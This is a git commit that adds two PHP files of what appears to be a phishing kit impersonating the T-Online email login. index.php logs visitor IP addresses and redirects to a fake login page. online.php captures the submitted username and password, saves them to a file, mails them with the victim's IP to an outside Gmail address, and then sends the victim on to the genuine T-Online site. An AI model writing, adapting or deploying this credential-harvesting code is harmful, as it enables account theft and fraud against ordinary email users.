69634b53f21d884689fd2bacacabf70dfbb7b61e
hungrygorilla275 <55234288+hungrygorilla275@users.noreply.github.com>
2019-09-16 01:15:21 -0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,18 @@
+<?php
+
+include 'security/blocker_1.php';
+include 'security/blocker_2.php';
+include 'security/blocker_4.php';
+
+	$praga=rand();
+	$praga=md5($praga);
+
+	header("location: index1.html?cmd=login_submit&id=$praga$praga&session=$praga$praga");
+$ip = getenv("REMOTE_ADDR");
+
+
+
+$file = fopen("ipvisit.txt","a");
+fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
+
+?>
---
+++ online.php
@@ -0,0 +1,24 @@
+<?php   ob_start();  ?>
+
+<?
+$date = gmdate("Y/m/d | H:i:s");
+$ip = $_SERVER['REMOTE_ADDR'];
+$hostname = gethostbyaddr($ip);
+$useragent = $_SERVER['HTTP_USER_AGENT'];
+$message .= "--+ https://email.t-online.de/ +--\n";
+$message .= "Username: ".$_POST['username']."\n";
+$message .= "Password: ".$_POST['password']."\n";
+$message .= "--------------------------------\n";
+$message .= "IP : ".$_SERVER['REMOTE_ADDR']."\n";
+$message .= "-------+ CREATED BY GreenWhich +--------\n";
+
+$send="jbrautigam80303@gmail.com";
+$fp = fopen("details.txt","a");
+fputs($fp,$message);
+fclose($fp);
+$subject = "TONLINE | ".$_POST['username']." | $ip";
+$headers = "From: sm+kk<noreply>";
+@mail($send,$subject,$message,$from);
+@header("Location: https://email.t-online.de/");
+
+?>
